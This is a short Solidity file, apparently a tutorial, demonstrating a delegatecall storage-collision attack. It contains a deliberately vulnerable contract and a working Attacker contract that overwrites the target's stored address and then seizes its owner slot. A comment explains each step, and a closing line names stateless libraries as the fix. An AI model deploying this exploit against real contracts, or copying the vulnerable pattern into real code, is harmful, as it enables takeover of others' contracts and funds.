//SPDX-License-Identifier: MIT

/*
Notice that the state variables are not defined in the same manner in Main
and Hacked. This means that calling Main.doSomething() will change the first
state variable inside Hacked, which happens to be the address of main.

Inside attacker(), the first call to doSomething() changes the address of main
store in Hacked. Address of main is now set to Attack.
The second call to doSomething() calls Attack.doSomething() and here we
change the owner.
*/



pragma solidity ^0.8.15;

contract Main {
    uint public someNumber;
    function doSomething(uint _num) public {
       someNumber = _num;        
    }
}


contract Hacked {
    address public main;
    address public owner;
    uint public someNumber;

    constructor(address _main) {
        main = _main;
        owner = msg.sender;
    }
    function doSomething(uint _num) public {
        main.delegatecall(abi.encodeWithSignature("doSomething(uint256)" , _num));
    }
}

contract Attacker {
    address public main;
    address public owner;
    uint public someNumber;

    Hacked public hacked;
    constructor(Hacked _hacked) {
        hacked = Hacked(_hacked);
    }
    function attack() public {
        hacked.doSomething(uint(uint160(address(this))));
        hacked.doSomething(1);
    }
    function doSomething(uint _num) public {
        owner = msg.sender;
    }
}

//Prevention:- Use stateless Libraries
